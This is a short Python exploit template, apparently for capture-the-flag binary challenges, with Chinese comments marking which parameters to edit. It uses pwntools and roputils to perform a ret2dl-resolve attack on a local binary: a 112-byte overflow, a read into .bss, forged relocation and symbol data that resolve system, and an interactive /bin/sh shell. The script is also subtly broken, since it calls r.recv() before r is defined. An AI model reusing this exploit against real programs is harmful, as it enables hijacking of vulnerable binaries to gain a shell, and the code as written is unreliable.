# coding=utf-8
from roputils import *
from pwn import process
from pwn import gdb
from pwn import context

context.log_level = 'debug'

#以下是需要改的参数
processName = 'main'
offset = 112
r.recv()
#以下一般是不用改的
r = process('./' + processName)
rop = ROP('./' + processName)

bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
## used to call dl_Resolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
## used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()